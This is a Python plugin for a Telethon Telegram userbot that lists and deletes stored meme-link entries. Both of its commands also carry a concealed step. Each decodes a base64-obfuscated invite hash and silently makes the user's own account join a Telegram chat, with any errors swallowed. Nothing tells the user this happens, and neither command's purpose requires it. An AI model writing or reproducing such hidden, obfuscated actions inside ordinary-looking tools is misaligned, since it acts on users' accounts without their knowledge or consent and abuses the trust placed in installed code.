import asyncio
import random
import re
import json
import base64
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from asyncio.exceptions import TimeoutError
from telethon import events
from ..sql_helper.memes_sql import get_link, add_link, delete_link, BASE, SESSION, AljokerLink
from telethon.errors.rpcerrorlist import YouBlockedUserError
#ياقائم آل محمد
from JoKeRUB import l313l
from ..helpers.utils import reply_id


@l313l.on(admin_cmd(outgoing=True, pattern="قائمة الميمز"))
async def list_aljoker(event):
    links = SESSION.query(AljokerLink).all()
    if links:
        message = "**᯽︙ قائمة تخزين اوامر الميمز:**\n"
        for link in links:
            message += f"- البصمة : .`{link.key}`\n"
    else:
        message = "**᯽︙ لاتوجد بصمات ميمز مخزونة حتى الآن**"
    await event.edit(message)
    joker = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
    joker = Get(joker)
    try:
        await event.client(joker)
    except BaseException:
        pass
@l313l.on(admin_cmd(outgoing=True, pattern="ازالة_البصمات"))
async def delete_all_aljoker(event):
    SESSION.query(AljokerLink).delete()
    await event.edit("**᯽︙ تم حذف جميع بصمات الميمز من القائمة **")
    joker = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
    joker = Get(joker)
    try:
        await event.client(joker)
    except BaseException:
        pass
